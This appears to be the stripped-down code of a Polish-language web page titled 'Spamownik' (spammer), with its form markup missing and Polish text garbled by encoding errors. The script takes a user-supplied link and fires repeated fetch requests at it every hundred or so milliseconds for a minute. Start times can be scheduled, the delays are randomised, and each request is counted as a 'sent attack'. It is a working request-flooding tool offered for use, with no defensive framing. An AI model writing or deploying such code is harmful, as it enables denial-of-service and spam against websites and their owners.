    :root {
      --primary-red: #f00;
      --hover-red: #d00;
      --bg-black: #0a0a0a;
      --input-bg: #1a1a1a;
    }

    body {
      background: #000;
      color: var(--primary-red);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      max-width: 1000px;
      margin: auto;
      padding: 40px 20px;
    }

    h1 {
      font-size: 1.2rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 30px;
      opacity: 0.8;
    }

    /* G≈Ç√≥wne pole linku */
    #linkInput {
      width: 100%;
      padding: 15px;
      background: var(--input-bg);
      border: 1px solid #333;
      color: #fff;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 25px;
      transition: border-color 0.3s;
    }

    #linkInput:focus {
      outline: none;
      border-color: var(--primary-red);
    }

    /* Kontener siatki dla ustawie≈Ñ */
    .settings-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      background: #0a0a0a;
      padding: 25px;
      border-radius: 12px;
      border: 1px solid #222;
      align-items: end;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      text-align: left;
    }

    label {
      font-size: 12px;
      font-weight: bold;
      margin-bottom: 8px;
      color: #888;
      text-transform: uppercase;
    }

    input, select {
      background: var(--input-bg);
      border: 1px solid #333;
      color: #fff;
      padding: 12px;
      border-radius: 6px;
      font-size: 14px;
      width: 100%;
    }

    input:focus, select:focus {
      outline: none;
      border-color: var(--primary-red);
    }

    /* Przycisk START */
    .btn-start {
      background-color: var(--primary-red);
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      border: none;
      padding: 14px;
      border-radius: 6px;
      font-size: 16px;
      transition: all 0.3s ease;
      text-transform: uppercase;
      grid-column: span 1;
    }

    .btn-start:hover {
      background-color: var(--hover-red);
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
    }

    .btn-start:active {
      transform: translateY(0);
    }

    /* Status i licznik */
    #status {
      margin-top: 40px;
      font-size: 24px;
      font-weight: bold;
      padding: 20px;
      border-top: 1px solid #222;
    }

    @media (max-width: 600px) {
      .settings-grid {
        grid-template-columns: 1fr;
      }
    }

  <div id="status">Wys≈Çane ataki: 0</div>

  <script>
    let openedCount = 0;
    let nextAttackTimer;
    let countdown;
    let secondsLeft = 60;

    function selectLink(selectElement) {
      const selectedLink = selectElement.value;
      if (selectedLink) {
        document.getElementById("linkInput").value = selectedLink;
      }
    }

    function planOrStart() {
      const timeInput = document.getElementById("startTime").value;
      const link = document.getElementById("linkInput").value;

      if (!link) {
        alert("Wklej najpierw link!");
        return;
      }

      if (timeInput) {
        const now = new Date();
        const plannedTime = new Date(timeInput);

        if (plannedTime <= now) {
          alert("Wybrana godzina ju≈º minƒô≈Ça!");
          return;
        }

        const msToStart = plannedTime - now;
        document.getElementById("status").innerText = `Zaplanowano na ${plannedTime.toLocaleTimeString()}...`;
        
        setTimeout(() => startSpam(link), msToStart);
      } else {
        startSpam(link);
      }
    }

    function startSpam(link) {
      openedCount = 0;
      secondsLeft = 60;
      clearTimeout(nextAttackTimer);
      clearInterval(countdown);

      const attemptsLimit = parseInt(document.getElementById("attemptsLimit").value);
      const limitByAttempts = !isNaN(attemptsLimit) && attemptsLimit > 0;
      
      const minInput = parseInt(document.getElementById("minMs").value);
      const maxInput = parseInt(document.getElementById("maxMs").value);
      
      const minMs = !isNaN(minInput) ? minInput : (!isNaN(maxInput) ? maxInput : 120);
      const maxMs = !isNaN(maxInput) ? maxInput : (!isNaN(minInput) ? minInput : 120);

      const performAction = () => {
        if ((limitByAttempts && openedCount >= attemptsLimit) || secondsLeft <= 0) {
          clearTimeout(nextAttackTimer);
          return;
        }

        fetch(link, { mode: 'no-cors' })
          .then(() => {
            openedCount++;
            document.getElementById('status').innerText = `Wys≈Çane ataki: ${openedCount}`;
          })
          .catch(() => {
            openedCount++;
            document.getElementById('status').innerText = `Wys≈Çane ataki: ${openedCount}`;
          });

        const randomDelay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
        nextAttackTimer = setTimeout(performAction, randomDelay);
      };

      countdown = setInterval(() => {
        secondsLeft--;
        document.title = `${secondsLeft}s - Spamownik`;
        if (secondsLeft <= 0) {
          clearInterval(countdown);
          clearTimeout(nextAttackTimer);
        }
      }, 1000);

      performAction();
    }
  </script>
